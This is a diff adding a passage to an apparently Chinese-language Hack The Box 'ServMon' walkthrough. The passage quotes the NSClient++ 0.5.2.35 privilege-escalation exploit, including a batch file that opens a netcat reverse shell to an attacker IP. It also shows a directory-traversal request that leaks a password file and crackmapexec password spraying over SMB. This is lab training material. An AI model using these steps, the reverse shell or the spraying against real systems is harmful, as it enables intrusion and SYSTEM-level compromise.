@@ -327,4 +327,162 @@ Response
 [Mail]
 MAPI=1
 ```
+### Website-TCP 8443
+#### 8443号上有一个TLS服务器。通常使用证书，我将获得主机名并可能查找vhosts，但此证书仅用于localhost。
+#### 该站点是NSClient++的一个实例，一个用于监控的代理：
+#### 这里似乎坏得很厉害。在chrome（而不是Firefox）中访问确实提供了登录（某些时候）。
+#### 让这个网站工作是相当令人沮丧的。就像我上面说的，我在Chromium上比在Firefox上取得了更大的成功，但即使那样，它也不稳定。
+### Vulnerabilities 缺陷 NSClient++ 0.5.2.35:
+```
+[★]$ searchsploit nsclient
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+NSClient++ 0.5.2.35 - Authenticated Remote Co | json/webapps/48360.txt
+NSClient++ 0.5.2.35 - Privilege Escalation    | windows/local/46802.txt
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+#### 这是一个本地私有，因为在盒子上有一个shell，我可以从配置文件中获得admin明文密码，然后登录并创建一个工作来获得shell。我会记住的。
+```
+[★]$ searchsploit -m windows/local/46802.txt
+  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/46802
+     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
+    Codes: N/A
+ Verified: False
+File Type: ASCII text, with very long lines (466)
+Copied to: /home/syareya55/46802.txt
 
+[★]$ cat 46802.txt
+Exploit Author: bzyo
+Twitter: @bzyo_
+Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
+Date: 05-05-19
+Vulnerable Software: NSClient++ 0.5.2.35
+Vendor Homepage: http://nsclient.org/
+Version: 0.5.2.35
+Software Link: http://nsclient.org/download/
+Tested on: Windows 10 x64
+
+Details:
+When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.
+
+The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.
+
+Prerequisites:
+To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.
+
+Exploit:
+1. Grab web administrator password
+- open c:\program files\nsclient++\nsclient.ini
+or
+- run the following that is instructed when you select forget password
+	C:\Program Files\NSClient++>nscp web -- password --display
+	Current password: SoSecret
+
+2. Login and enable following modules including enable at startup and save configuration
+- CheckExternalScripts
+- Scheduler
+
+3. Download nc.exe and evil.bat to c:\temp from attacking machine
+	@echo off
+	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
+
+4. Setup listener on attacking machine
+	nc -nlvvp 443
+
+5. Add script foobar to call evil.bat and save settings
+- Settings > External Scripts > Scripts
+- Add New
+	- foobar
+		command = c:\temp\evil.bat
+
+6. Add schedulede to call script every 1 minute and save settings
+- Settings > Scheduler > Schedules
+- Add new
+	- foobar
+		interval = 1m
+		command = foobar
+
+7. Restart the computer and wait for the reverse shell on attacking machine
+	nc -nlvvp 443
+	listening on [any] 443 ...
+	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
+	Microsoft Windows [Version 10.0.17134.753]
+	(c) 2018 Microsoft Corporation. All rights reserved.
+
+	C:\Program Files\NSClient++>whoami
+	whoami
+	nt authority\system
+
+Risk:
+The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
+```
+### Shell as nadine
+#### 得到密码
+#### 我首先尝试使用目录遍历漏洞读取NSClient++配置文件，但它不起作用。
+
+#### 我从FTP笔记中知道，在C:\users\nathan\desktop\password.txt有一个密码文件。我将使用目录遍历漏洞来尝试读取该文件，它可以工作：
+![图片](images/2026020902.png)
+```
+[★]$ burpsuite
+
+浏览器导航到http://10.129.227.77
+设置浏览器为本地地址端口是8080，同burpsuite的8080端口一样
+浏览器http://10.129.227.77开始添加为：
+http://10.129.227.77/../../../../../../../../../../../../users/nathan/desktop/passwords.txt回车
+在burpsuite,Ctrl+R,Shitf+Ctrl+R,同样添加../../../../../../../../../../../../然后Send:
+```
+![图片](images/2026020903.png)
+```
+HTTP/1.1 200 OK
+Content-type: text/plain
+Content-Length: 156
+Connection: close
+AuthInfo: 
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
+### Check Passwords
+#### 因为我只有一个没有用户名的密码列表，所以我将创建一个我现在知道的列表：
+```
+[★]$ cat users
+administrator
+nathan
+nadine
+
+[★]$ cat passwords
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
+#### 我现在可以使用crackmapexec来查看这些密码是否适用于smb的任何用户：
+```
+[★]$ crackmapexec smb 10.129.227.77 -u users -p passwords
+SMB         10.129.227.77   445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\administrator:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE
+SMB         10.129.227.77   445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk
+```
+### SSH
+####  由于SSH正在监听这个Windows盒子，我可以使用它来获取shell：
